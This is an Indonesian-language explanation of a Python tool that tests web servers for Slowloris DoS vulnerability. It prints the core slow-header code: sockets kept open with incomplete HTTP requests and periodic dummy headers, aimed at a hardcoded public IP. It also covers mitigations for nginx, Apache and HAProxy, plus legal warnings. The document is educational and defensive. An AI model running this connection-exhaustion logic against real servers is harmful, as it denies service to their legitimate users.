# Penjelasan Mendalam: HTTP Slowloris Checker

## Apa Itu Kode Ini?

Kode ini adalah **HTTP Slowloris Attack Checker** - sebuah tool untuk menguji kerentanan server web terhadap serangan Denial of Service (DoS) jenis Slowloris.

## Konsep Serangan Slowloris

### Cara Kerja Slowloris

Slowloris adalah serangan DoS yang sangat efektif namun "subtle" (halus):

1. **Membuka Koneksi HTTP** ke server target
2. **Mengirim header HTTP secara perlahan** - tidak lengkap, satu per satu
3. **Tidak pernah menyelesaikan request** - header tidak pernah diakhiri dengan `\r\n\r\n`
4. **Menjaga koneksi tetap hidup** dengan mengirim header dummy secara berkala
5. **Menghabiskan connection pool server** - server kehabisan slot untuk koneksi baru

### Mengapa Efektif?

```
Server Normal:
┌─────────────────────────────────────┐
│ Connection Pool: 1000 slots         │
│ ✓ User1  ✓ User2  ✓ User3  ...     │
│ Request → Response → Close          │
└─────────────────────────────────────┘

Server Under Slowloris:
┌─────────────────────────────────────┐
│ Connection Pool: 1000 slots         │
│ ⏳ Attacker1  ⏳ Attacker2  ...     │
│ Request... (never completes)        │
│ All slots occupied → Legit users    │
│ cannot connect!                     │
└─────────────────────────────────────┘
```

**Keunggulan Slowloris:**
- Tidak perlu bandwidth besar (hanya beberapa KB/s)
- Tidak perlu banyak mesin (1 mesin bisa efektif)
- Sulit dideteksi (terlihat seperti koneksi lambat biasa)
- Tidak ada "flood" yang jelas di network traffic

## Bagaimana Kode Ini Bekerja?

### Arsitektur Kode

```
┌─────────────────────────────────────────────────────────┐
│                    MAIN FUNCTION                        │
│  - Parse target URL                                     │
│  - Validate allowlist                                   │
│  - Create worker threads                                │
└─────────────────┬───────────────────────────────────────┘
                  │
                  ├─→ Worker Thread 1 ──→ Port 80
                  ├─→ Worker Thread 2 ──→ Port 80
                  ├─→ Worker Thread 3 ──→ Port 443
                  ├─→ Worker Thread 4 ──→ Port 443
                  └─→ Worker Thread N ──→ ...
                  │
                  ↓
┌─────────────────────────────────────────────────────────┐
│                  WORKER FUNCTION                        │
│  1. Connect to server                                   │
│  2. Wrap with TLS if needed                             │
│  3. Send initial headers (incomplete)                   │
│  4. Loop: Send dummy headers every N seconds            │
│  5. Record results                                      │
└─────────────────────────────────────────────────────────┘
```

### Flow Detail

#### 1. Initialization
```python
TARGET = "http://139.99.61.184"
PORTS = [80, 443]
CONNS_PER_PORT = 5
DURATION_SEC = 30
```

#### 2. Connection Setup
```python
# Buat socket TCP
s = socket.create_connection((host, port), timeout=10)

# Wrap dengan TLS jika HTTPS
if port == 443:
    s = ssl.wrap_socket(s)
```

#### 3. Slow Header Attack
```python
# Kirim header awal (TIDAK LENGKAP!)
sock.sendall(b"GET / HTTP/1.1\r\n")
sock.sendall(b"Host: target.com\r\n")
sock.sendall(b"User-Agent: ...\r\n")
# ⚠️ TIDAK ADA \r\n\r\n di akhir!

# Loop: kirim header dummy setiap 5 detik
while time.time() < end_time:
    sock.sendall(b"X-Dummy-1234: value\r\n")
    time.sleep(5)  # Keep connection alive
```

#### 4. Observation
```python
# Catat berapa lama koneksi bertahan
if connection_lasted >= 30s:
    print("Server VULNERABLE - koneksi tidak ditutup")
else:
    print("Server PROTECTED - koneksi ditutup cepat")
```

## Komponen Kode

### 1. Utility Functions

#### `is_ip(host)`
Mengecek apakah string adalah IP address valid.

```python
is_ip("192.168.1.1")  # True
is_ip("example.com")  # False
```

#### `resolve_host(host)`
Resolve hostname ke IP address.

```python
resolve_host("google.com")  # "142.250.x.x"
resolve_host("8.8.8.8")     # "8.8.8.8"
```

#### `ensure_allowed(host)`
Safety check - pastikan target ada di allowlist.

```python
# Cegah testing ke server yang tidak berhak
if public_ip and ip not in ALLOWLIST:
    sys.exit(1)  # STOP!
```

### 2. Core Classes

#### `ConnResult`
Menyimpan hasil testing per koneksi.

```python
class ConnResult:
    port: int           # Port yang ditest (80/443)
    started_at: float   # Timestamp mulai
    closed_at: float    # Timestamp selesai
    error: str          # Error message jika ada
    sent_lines: int     # Jumlah header yang dikirim
    
    @property
    def duration(self):
        # Hitung berapa lama koneksi bertahan
        return closed_at - started_at
```

### 3. Core Functions

#### `make_socket(host, port)`
Membuat koneksi TCP ke server.

```python
s = socket.create_connection(
    (host, port),
    timeout=10  # Max 10 detik untuk connect
)
s.settimeout(10)  # Max 10 detik untuk read/write
```

#### `wrap_tls_if_needed(sock, host, port, scheme)`
Wrap socket dengan TLS untuk HTTPS.

```python
if scheme == "https" or port == 443:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False  # Testing only
    ctx.verify_mode = ssl.CERT_NONE
    sock = ctx.wrap_socket(sock)
```

#### `send_slow_headers(host, sock, res, end_ts)`
**INI INTI DARI SERANGAN!**

```python
# 1. Kirim header awal (TIDAK LENGKAP)
first = (
    f"GET {PATH} HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    f"User-Agent: slowloris-check/1.0\r\n"
    # ⚠️ TIDAK ADA \r\n\r\n!
).encode()
sock.sendall(first)

# 2. Loop: kirim header dummy
while time.time() < end_ts:
    dummy = f"X-Dummy-{random.randint(1000,9999)}: {random.randint(0,999999)}\r\n"
    sock.sendall(dummy.encode())
    
    # 3. Cek apakah server menutup koneksi
    try:
        data = sock.recv(1)  # Non-blocking read
        if data:
            # Server mengirim response = menutup koneksi
            break
    except socket.timeout:
        pass  # Masih terbuka
    
    time.sleep(INTERVAL_SEC)  # Wait before next header
```

#### `worker(host, port, scheme, result_list, end_ts)`
Thread worker yang menjalankan satu koneksi test.

```python
def worker(...):
    res = ConnResult(port)
    s = None
    
    try:
        s = make_socket(host, port)
        s = wrap_tls_if_needed(s, host, port, scheme)
        send_slow_headers(host, s, res, end_ts)
    except Exception as e:
        res.error = f"Error: {e}"
    finally:
        if s:
            s.close()
        result_list.append(res)
```

#### `summarize(results, port)`
Analisis hasil testing per port.

```python
kept = [r for r in results 
        if r.error is None and r.duration >= DURATION_SEC]
early = [r for r in results 
         if r.error or r.duration < DURATION_SEC]

if kept:
    print("⚠️ Server VULNERABLE")
    print("   Koneksi bertahan lama = tidak ada timeout protection")
else:
    print("✓ Server PROTECTED")
    print("   Koneksi ditutup cepat = ada timeout protection")
```

## Interpretasi Hasil

### Scenario 1: Server Vulnerable
```
[PORT 80] connections: 5
  - kept open >= 30s : 5
  - closed early     : 0

* Interpretasi: server menoleransi header lambat cukup lama.
  Periksa/ketatkan: client_header_timeout / read_header_timeout
```

**Artinya:**
- Semua 5 koneksi bertahan sampai 30 detik
- Server tidak menutup koneksi yang lambat
- **VULNERABLE** terhadap Slowloris attack
- Attacker bisa exhaust connection pool dengan mudah

### Scenario 2: Server Protected
```
[PORT 80] connections: 5
  - kept open >= 30s : 0
  - closed early     : 5 (median close at ~8.5s)

* Interpretasi: server menutup koneksi cepat
  (mitigasi header timeout tampak aktif).
```

**Artinya:**
- Semua koneksi ditutup dalam ~8.5 detik
- Server punya timeout protection
- **PROTECTED** dari Slowloris attack
- Connection pool tidak bisa di-exhaust

## Konfigurasi Penting

### Safe Testing Values
```python
CONNS_PER_PORT = 5      # Kecil untuk testing aman
DURATION_SEC = 30       # Cukup untuk observasi
INTERVAL_SEC = 5        # Realistic slow connection
CONNECT_TIMEOUT = 10    # Reasonable timeout
```

### Dangerous Values (JANGAN DIGUNAKAN!)
```python
CONNS_PER_PORT = 200000  # ❌ Akan crash sistem!
DURATION_SEC = 300       # ❌ Terlalu lama
INTERVAL_SEC = 50        # ❌ Tidak realistis
CONNECT_TIMEOUT = 1000000 # ❌ 11.5 hari?!
```

## Mitigasi untuk Server

### Nginx
```nginx
# Timeout untuk header client
client_header_timeout 10s;

# Limit koneksi per IP
limit_conn_zone $binary_remote_addr zone=addr:10m;
limit_conn addr 10;

# Rate limiting
limit_req_zone $binary_remote_addr zone=req:10m rate=10r/s;
limit_req zone=req burst=20;
```

### Apache
```apache
# Timeout
Timeout 10
RequestReadTimeout header=10-20,MinRate=500

# Load mod_reqtimeout dan mod_qos
LoadModule reqtimeout_module modules/mod_reqtimeout.so
```

### HAProxy
```
timeout client 10s
timeout http-request 10s
```

## Aspek Legal & Etis

### ⚠️ PERINGATAN KERAS

**LEGAL:**
- Testing tanpa izin = **ILEGAL**
- Melanggar Computer Fraud and Abuse Act (US)
- Melanggar UU ITE (Indonesia)
- Bisa dipenjara dan didenda

**ETIS:**
- Hanya test server milik sendiri
- Atau dengan izin tertulis eksplisit
- Gunakan nilai konfigurasi yang aman
- Jangan ganggu layanan production

**USE CASES YANG SAH:**
1. ✅ Testing server development milik sendiri
2. ✅ Security audit dengan kontrak resmi
3. ✅ Pembelajaran di lab/sandbox environment
4. ✅ Bug bounty program yang mengizinkan DoS testing
5. ❌ Testing server orang lain tanpa izin
6. ❌ "Testing" untuk mengganggu layanan
7. ❌ Demonstrasi serangan untuk pamer

## Kesimpulan

Kode ini adalah **educational security tool** untuk:
- Memahami cara kerja Slowloris attack
- Testing keamanan server milik sendiri
- Validasi konfigurasi timeout server
- Pembelajaran tentang DoS mitigation

**Bukan untuk:**
- Menyerang server orang lain
- Mengganggu layanan
- Aktivitas ilegal

---

**Remember: Dengan kekuatan besar datang tanggung jawab besar!**
